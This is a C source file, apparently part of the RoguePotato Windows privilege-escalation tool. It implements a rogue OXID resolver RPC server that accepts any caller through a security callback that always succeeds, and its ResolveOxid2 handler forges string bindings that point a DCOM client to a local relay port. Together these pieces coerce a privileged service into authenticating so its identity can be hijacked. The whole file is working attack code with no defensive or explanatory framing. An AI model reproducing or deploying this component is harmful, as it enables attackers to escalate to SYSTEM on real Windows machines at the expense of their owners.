#include "Windows.h"
#include "stdio.h"
#include "RogueOxidResolver_h.h"
#include "RogueOxidResolver.h"

#pragma comment( lib, "Rpcrt4.lib" )

extern wchar_t* g_rpcRelayServerListeningPort;

RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE hInterface, void* pBindingHandle);

int RunRogueOxidResolver(char* listening_port) {
	RPC_STATUS status;
	RPC_BINDING_VECTOR* pbindingVector = 0;
	// Uses the protocol combined with the endpoint for receiving
	// remote procedure calls.
	const char* pszProtocolSequence = "ncacn_ip_tcp";
	const char* pszEndpoint = listening_port;
	unsigned char* pszSecurity = NULL;
	unsigned int cMaxCalls = 20;

	status = RpcServerUseProtseqEpA((RPC_CSTR)pszProtocolSequence, cMaxCalls, (RPC_CSTR)pszEndpoint, pszSecurity);
	if (status) {
		printf("[-] RpcServerUseProtseqEp() failed with status code %d\n", status);
		return (-1);
	}

	status = RpcServerRegisterIf2(
		IObjectExporter_v0_0_s_ifspec, // Interface to register.
		NULL, // Use the MIDL generated entry-point vector.
		NULL, // Use the MIDL generated entry-point vector.
		RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH, // Forces use of security callback.
		RPC_C_LISTEN_MAX_CALLS_DEFAULT, // Use default number of concurrent calls.
		(unsigned)-1, // Infinite max size of incoming data blocks.
		SecurityCallback); // Naive security callback
	if (status) {
		printf("[-] RpcServerRegisterIf2() failed with status code %d\n", status);
		return (-1);
	}

	status = RpcServerInqBindings(&pbindingVector);
	if (status) {
		printf("[-] RpcServerInqBindings() failed with status code %d\n", status);
		return (-1);
	}

	status = RpcServerRegisterAuthInfoA((RPC_CSTR)"",
		RPC_C_AUTHN_WINNT,
		NULL,
		NULL);
	if (status) {
		printf("[-] RpcServerRegisterAuthInfoA() failed with status code %d\n", status);
		return (-1);
	}

	status = RpcEpRegisterA(IObjectExporter_v0_0_s_ifspec,
		pbindingVector,
		0,
		(RPC_CSTR)"RoguePotato");
	if (status) {
		printf("[-] RpcEpRegister() failed with status code %d\n", status);
		return (-1);
	}

	printf("[*] Starting RogueOxidResolver RPC Server listening on port %s ... \n", pszEndpoint);

	// Start to listen for remote procedure calls for all registered interfaces.
	// This call will not return until RpcMgmtStopServerListening is called.
	status = RpcServerListen(
		1, // Recommended minimum number of threads.
		RPC_C_LISTEN_MAX_CALLS_DEFAULT, // Recommended maximum number of threads.
		FALSE); // Start listening now.
	if (status) {
		printf("[-] RpcServerListen() failed with status code %d\n", status);
		return (-1);
	}
	return 0;
}


error_status_t ResolveOxid(
	_In_ handle_t hRpc,
	_In_  OXID* pOxid,
	_In_ unsigned short cRequestedProtseqs,
	_In_  unsigned short arRequestedProtseqs[],
	_Out_  DUALSTRINGARRAY** ppdsaOxidBindings,
	_Out_ IPID* pipidRemUnknown,
	_Out_ DWORD* pAuthnHint)
{

	printf("[*] ResolveOxid RPC call\n");
	return RPC_S_OK;
}


error_status_t SimplePing
(
	handle_t  hRpc,
	SETID* pSetId
)
{
	printf("[*] SimplePing RPC call\n");

	return RPC_S_OK;
}

error_status_t ComplexPing
(
	handle_t        hRpc,
	SETID* pSetId,
	unsigned short  SequenceNum,
	unsigned short  cAddToSet,
	unsigned short  cDelFromSet,
	OID AddToSet[],
	OID DelFromSet[],
	unsigned short* pPingBackoffFactor
)
{
	printf("[*] ComplexPing RPC call\n");
	return RPC_S_OK;
}

error_status_t ServerAlive
(
	handle_t        hRpc
)
{
	printf("[*] ServerAlive RPC call\n");
	return RPC_S_OK;
}

error_status_t ResolveOxid2
(
	handle_t        hRpc,
	OXID* pOxid,
	unsigned short  cRequestedProtseqs,
	unsigned short  arRequestedProtseqs[],
	DUALSTRINGARRAY** ppdsaOxidBindings,
	IPID* pipidRemUnknown,
	DWORD* pAuthnHint,
	COMVERSION* pComVersion
)
{
	size_t wcstombsOut;
	char endpoint[MAX_PATH];
	char port[10];
	memset(port, 0, 10);
	wcstombs_s(&wcstombsOut, port, 9, g_rpcRelayServerListeningPort, 9);

	printf("[*] ResolveOxid2 RPC call\n");
	*pAuthnHint = RPC_C_AUTHN_LEVEL_CONNECT;
	CLSIDFromString(OLESTR("{11111111-2222-3333-4444-555555555555}"), (CLSID*)pipidRemUnknown);
	sprintf_s(endpoint, MAX_PATH, "127.0.0.1[%s]", port);
	int endpoint_len = (int)strlen(endpoint) + 1;
	char principalName[] = "";
	int nEntries = (1 + endpoint_len + 1 + 2 + sizeof(principalName) + 1);
	int securityOffset = (1 + endpoint_len) + 1;
	COMVERSION outputCom;
	outputCom.MajorVersion = 5;
	outputCom.MinorVersion = 7;
	*pComVersion = outputCom;
	*ppdsaOxidBindings = (DUALSTRINGARRAY*)malloc(nEntries * sizeof(WCHAR) + sizeof(DUALSTRINGARRAY));
	(*ppdsaOxidBindings)->wNumEntries = nEntries;
	(*ppdsaOxidBindings)->wSecurityOffset = securityOffset;
	//(*ppdsaOxidBindings)->aStringArray[0] = 0x0F; //ncacn_np
	(*ppdsaOxidBindings)->aStringArray[0] = 0x07; //ncacn_ip_tcp
	int z = 0;
	for (int i = 1; i < endpoint_len + 1; i++) {
		(*ppdsaOxidBindings)->aStringArray[i] = (unsigned short)endpoint[z];
		z++;
	}
	(*ppdsaOxidBindings)->aStringArray[securityOffset - 1] = 0x00; // null byte separator between string bindings and security bindings
	(*ppdsaOxidBindings)->aStringArray[securityOffset] = RPC_C_AUTHN_WINNT;// 0x0a
	securityOffset++;
	(*ppdsaOxidBindings)->aStringArray[securityOffset] = 0xffff;
	securityOffset++;
	int j = 0;
	for (int i = securityOffset; i < nEntries - 1; i++) {
		(*ppdsaOxidBindings)->aStringArray[i] = (unsigned short)principalName[j];
		j++;
	}
	(*ppdsaOxidBindings)->aStringArray[nEntries] = 0;
	(*ppdsaOxidBindings)->aStringArray[nEntries - 1] = 0; //some magic fix again....
	return RPC_S_OK;
}


error_status_t ServerAlive2
(
	handle_t        hRpc,
	COMVERSION* pComVersion,
	DUALSTRINGARRAY** ppdsaOrBindings,
	DWORD* pReserved
) {
	printf("[*] ServerAlive2 RPC Call\n");
	return RPC_S_OK;
}

RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE hInterface, void* pBindingHandle)
{
	return RPC_S_OK; // Always allow anyone.
}

// Memory allocation function for RPC.
// The runtime uses these two functions for allocating/deallocating
// enough memory to pass the string to the server.
void* __RPC_USER midl_user_allocate(size_t size)
{
	return malloc(size);
}

// Memory deallocation function for RPC.
void __RPC_USER midl_user_free(void* p)
{
	free(p);
}
